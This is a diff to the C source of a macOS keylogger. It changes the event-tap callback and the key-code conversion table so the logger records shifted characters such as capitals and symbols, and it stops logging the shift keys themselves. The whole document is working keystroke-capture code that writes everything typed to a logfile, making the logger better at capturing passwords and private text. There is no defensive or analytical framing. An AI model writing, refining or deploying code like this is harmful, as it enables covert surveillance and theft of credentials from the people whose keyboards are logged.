@@ -1,6 +1,9 @@
 #include "keylogger.h"
 
 int keyCodeCache[127];
+int capsLock = 57;
+int leftShift = 56;
+int rightShift = 60;
 
 int main(int argc, const char *argv[]) {
 
@@ -64,16 +67,19 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     // Retrieve the incoming keycode.
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
-    if (type == kCGEventFlagsChanged && keyCodeCache[keyCode] == 1 && keyCode != 57) {
+    if (type == kCGEventFlagsChanged && keyCodeCache[keyCode] == 1 && keyCode != capsLock) {
         keyCodeCache[keyCode] = 0;
         return event;
     }
 
-    // Print the human readable key to the logfile.
-    fprintf(logfile, "%s", convertKeyCode(keyCode));
-    fflush(logfile);
+    // don't log the shift keys
+    if (keyCode != leftShift && keyCode != rightShift) {
+        // Print the human readable key to the logfile.
+        fprintf(logfile, "%s", convertKeyCode(keyCode, keyCodeCache[leftShift] + keyCodeCache[rightShift]));
+        fflush(logfile);
+    }
 
-    if (type == kCGEventFlagsChanged && keyCode != 57) {
+    if (type == kCGEventFlagsChanged && keyCode != capsLock) {
         keyCodeCache[keyCode] = 1;
     }
 
@@ -82,55 +88,55 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
 
 // The following method converts the key code returned by each keypress as
 // a human readable key code in const char format.
-const char *convertKeyCode(int keyCode) {
+const char *convertKeyCode(int keyCode, int shift) {
     switch ((int) keyCode) {
-        case 0:   return "a";
-        case 1:   return "s";
-        case 2:   return "d";
-        case 3:   return "f";
-        case 4:   return "h";
-        case 5:   return "g";
-        case 6:   return "z";
-        case 7:   return "x";
-        case 8:   return "c";
-        case 9:   return "v";
-        case 11:  return "b";
-        case 12:  return "q";
-        case 13:  return "w";
-        case 14:  return "e";
-        case 15:  return "r";
-        case 16:  return "y";
-        case 17:  return "t";
-        case 18:  return "1";
-        case 19:  return "2";
-        case 20:  return "3";
-        case 21:  return "4";
-        case 22:  return "6";
-        case 23:  return "5";
-        case 24:  return "=";
-        case 25:  return "9";
-        case 26:  return "7";
-        case 27:  return "-";
-        case 28:  return "8";
-        case 29:  return "0";
-        case 30:  return "]";
-        case 31:  return "o";
-        case 32:  return "u";
-        case 33:  return "[";
-        case 34:  return "i";
-        case 35:  return "p";
-        case 37:  return "l";
-        case 38:  return "j";
-        case 39:  return "'";
-        case 40:  return "k";
-        case 41:  return ";";
-        case 42:  return "\\";
-        case 43:  return ",";
-        case 44:  return "/";
-        case 45:  return "n";
-        case 46:  return "m";
-        case 47:  return ".";
-        case 50:  return "`";
+        case 0:   return shift > 0 ? "A" : "a";
+        case 1:   return shift > 0 ? "S" : "s";
+        case 2:   return shift > 0 ? "D" : "d";
+        case 3:   return shift > 0 ? "F" : "f";
+        case 4:   return shift > 0 ? "H" : "h";
+        case 5:   return shift > 0 ? "G" : "g";
+        case 6:   return shift > 0 ? "Z" : "z";
+        case 7:   return shift > 0 ? "X" : "x";
+        case 8:   return shift > 0 ? "C" : "c";
+        case 9:   return shift > 0 ? "V" : "v";
+        case 11:  return shift > 0 ? "B" : "b";
+        case 12:  return shift > 0 ? "Q" : "q";
+        case 13:  return shift > 0 ? "W" : "w";
+        case 14:  return shift > 0 ? "E" : "e";
+        case 15:  return shift > 0 ? "R" : "r";
+        case 16:  return shift > 0 ? "Y" : "y";
+        case 17:  return shift > 0 ? "T" : "t";
+        case 18:  return shift > 0 ? "!" : "1";
+        case 19:  return shift > 0 ? "@" : "2";
+        case 20:  return shift > 0 ? "#" : "3";
+        case 21:  return shift > 0 ? "$" : "4";
+        case 22:  return shift > 0 ? "^" : "6";
+        case 23:  return shift > 0 ? "%" : "5";
+        case 24:  return shift > 0 ? "+" : "=";
+        case 25:  return shift > 0 ? "(" : "9";
+        case 26:  return shift > 0 ? "&" : "7";
+        case 27:  return shift > 0 ? "_" : "-";
+        case 28:  return shift > 0 ? "*" : "8";
+        case 29:  return shift > 0 ? ")" : "0";
+        case 30:  return shift > 0 ? "}" : "]";
+        case 31:  return shift > 0 ? "O" : "o";
+        case 32:  return shift > 0 ? "U" : "u";
+        case 33:  return shift > 0 ? "{" : "[";
+        case 34:  return shift > 0 ? "I" : "i";
+        case 35:  return shift > 0 ? "P" : "p";
+        case 37:  return shift > 0 ? "L" : "l";
+        case 38:  return shift > 0 ? "J" : "j";
+        case 39:  return shift > 0 ? "\"" : "'";
+        case 40:  return shift > 0 ? "K" : "k";
+        case 41:  return shift > 0 ? ":" : ";";
+        case 42:  return shift > 0 ? "|" : "\\";
+        case 43:  return shift > 0 ? "<" : ",";
+        case 44:  return shift > 0 ? "?" : "/";
+        case 45:  return shift > 0 ? "N" : "n";
+        case 46:  return shift > 0 ? "M" : "m";
+        case 47:  return shift > 0 ? ">" : ".";
+        case 50:  return shift > 0 ? "~" : "`";
         case 65:  return "[decimal]";
         case 67:  return "[asterisk]";
         case 69:  return "[plus]";
